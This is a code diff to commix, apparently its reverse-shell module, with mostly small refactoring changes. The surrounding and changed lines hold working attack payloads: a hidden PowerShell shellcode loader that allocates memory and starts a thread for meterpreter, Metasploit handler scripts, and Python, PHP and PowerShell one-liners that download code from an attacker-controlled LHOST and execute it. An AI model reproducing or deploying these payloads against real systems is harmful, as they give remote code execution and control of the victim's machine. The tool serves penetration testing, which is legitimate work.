@@ -386,7 +386,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
             continue
 
           payload = "windows/meterpreter/reverse_tcp"
-          # define standard metasploit payload
+          # Define standard metasploit payload
           info_msg = "Generating the '" + payload + "' shellcode... "
           sys.stdout.write(settings.print_info_msg(info_msg))
           sys.stdout.flush()
@@ -403,8 +403,6 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
               powershell_code = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = %s;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };';$goat = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if($env:PROCESSOR_ARCHITECTURE -eq "AMD64"){$x86 = $env:SystemRoot + "syswow64WindowsPowerShellv1.0powershell";$cmd = "-noninteractive -EncodedCommand";iex "& $x86 $cmd $goat"}else{$cmd = "-noninteractive -EncodedCommand";iex "& powershell $cmd $goat";}""" % (shellcode))
               other_shell = "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + base64.b64encode(powershell_code.encode('utf_16_le'))  
               print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
-              # Remove the ouput file.
-              #os.remove(output)
               with open(output, 'w+') as filewrite:
                 filewrite.write("use exploit/multi/handler\n"
                                 "set payload " + payload + "\n"
@@ -417,9 +415,10 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
             break
 
           elif windows_reverse_shell == '2':
-            unicorn_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../', 'thirdparty/unicorn'))
-            os.chdir(unicorn_path)
             try:
+              current_path = os.getcwd()
+              unicorn_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../', 'thirdparty/unicorn'))
+              os.chdir(unicorn_path)
               subprocess.Popen("python unicorn.py" + " " + str(payload) + " " + str(settings.LHOST) + " " + str(settings.LPORT) + ">/dev/null 2>&1", shell=True).wait()
               with open(output, 'r') as content_file:
                 other_shell = content_file.read().replace('\n', '')
@@ -433,6 +432,8 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
                                 "set lport " + str(settings.LPORT) + "\n"
                                 "exploit\n\n")
               msf_launch_msg("unicorn.rc")
+              # Return to the current path.
+              os.chdir(current_path)
             except:
               print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
             break
@@ -467,42 +468,43 @@ commix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + ""
           print settings.print_error_msg(error_msg)
           continue
 
-        output = "web_delivery.rc"
-        with open(output, 'w+') as filewrite:
-          filewrite.write("use exploit/multi/script/web_delivery\n"
-                          "set target " + str(int(web_delivery)-1) + "\n"
-                          "set payload " + payload + "\n"
-                          "set lhost " + str(settings.LHOST) + "\n"
-                          "set srvport " + str(settings.SRVPORT) + "\n"
-                          "set uripath " + settings.URIPATH + "\n"
-                          "exploit\n\n")
+        if 'payload' in locals():
+          output = "web_delivery.rc"
+          with open(output, 'w+') as filewrite:
+            filewrite.write("use exploit/multi/script/web_delivery\n"
+                            "set target " + str(int(web_delivery)-1) + "\n"
+                            "set payload " + payload + "\n"
+                            "set lhost " + str(settings.LHOST) + "\n"
+                            "set srvport " + str(settings.SRVPORT) + "\n"
+                            "set uripath " + settings.URIPATH + "\n"
+                            "exploit\n\n")
 
-        if web_delivery == '1':
-          data = "import urllib2; r=urllib2.urlopen('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "'); exec(r.read());"
-          data = base64.b64encode(data)
-          if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
-            set_python_working_dir()
-            other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + data + "'.decode('base64'))"
-          else:
-            other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
-          msf_launch_msg(output)
-          break
-        elif web_delivery == '2':
-          if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PHP_DIR:
-            set_php_working_dir()
-            other_shell = settings.WIN_PHP_DIR + " -d allow_url_fopen=true -r eval(file_get_contents('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "'));"
-          else:
-            other_shell = "php -d allow_url_fopen=true -r \"eval(file_get_contents('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "'));\""
-          msf_launch_msg(output)
-          break
-        elif web_delivery == '3':
-          if not settings.TARGET_OS == "win":
-            windows_only_attack_vector()
-            continue
-          else:
-            other_shell = "powershell -nop -w hidden -c $x=new-object net.webclient;$x.proxy=[Net.WebRequest]::GetSystemWebProxy(); $x.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; IEX $x.downloadstring('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "');"
+          if web_delivery == '1':
+            data = "import urllib2; r=urllib2.urlopen('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "'); exec(r.read());"
+            data = base64.b64encode(data)
+            if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
+              set_python_working_dir()
+              other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + data + "'.decode('base64'))"
+            else:
+              other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
             msf_launch_msg(output)
             break
+          elif web_delivery == '2':
+            if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PHP_DIR:
+              set_php_working_dir()
+              other_shell = settings.WIN_PHP_DIR + " -d allow_url_fopen=true -r eval(file_get_contents('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "'));"
+            else:
+              other_shell = "php -d allow_url_fopen=true -r \"eval(file_get_contents('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "'));\""
+            msf_launch_msg(output)
+            break
+          elif web_delivery == '3':
+            if not settings.TARGET_OS == "win":
+              windows_only_attack_vector()
+              continue
+            else:
+              other_shell = "powershell -nop -w hidden -c $x=new-object net.webclient;$x.proxy=[Net.WebRequest]::GetSystemWebProxy(); $x.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; IEX $x.downloadstring('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "');"
+              msf_launch_msg(output)
+              break
       break
     # Check for available shell options  
     elif any(option in other_shell.lower() for option in settings.SHELL_OPTIONS):
